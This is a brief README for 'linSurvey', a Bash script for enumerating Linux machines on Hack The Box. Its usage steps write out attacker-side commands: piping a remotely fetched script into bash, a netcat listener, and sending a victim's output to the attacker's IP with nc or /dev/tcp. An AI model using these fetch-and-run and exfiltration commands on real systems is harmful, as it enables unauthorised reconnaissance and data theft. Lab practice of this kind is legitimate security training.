# linSurvey

GNU/Linux enumeration script written in BASH.<br>
Created to enumerate GNU/Linux machines on Hack The Box. Can possibly be used against UNIX machines.<br> 
Visuals taken from HIGH ON COFFEE'S enumeration script. 

HOW TO USE:
1. Upload script to victim:
   1. bash linSurvey.sh
   2. (as needed) bash linSurvey.sh | tee /tmp/linSurvey.txt (saves a file on victim machine)
  
2. Use wget and pipe to bash:
   1. wget YOUR_IP_ADDR/linSurvey.sh -O- | bash
   2. The following transfers the output to your attack machine (no files on victim)
      1. <b>On Attack machine:</b> nc -nvvls YOUR_IP_ADDR -p YOUR_PORT > linSurvey.txt && cat linSurvey.txt
      2. <b>On Attack machine:</b> python3 -m http.server 80
      3. <b>On Victim:</b> wget YOUR_IP_ADDR/linSurvey.sh -O- | bash | nc -nvvq1 YOUR_IP_ADDR YOUR_PORT
      4. <b>On Victim:</b> (IF NO NETCAT) wget YOUR_IP_ADDR/linSurvey.sh -O- | bash > /dev/tcp/YOUR_IP_ADDR/YOUR_PORT (AS NEEDED)

  
  Enjoy
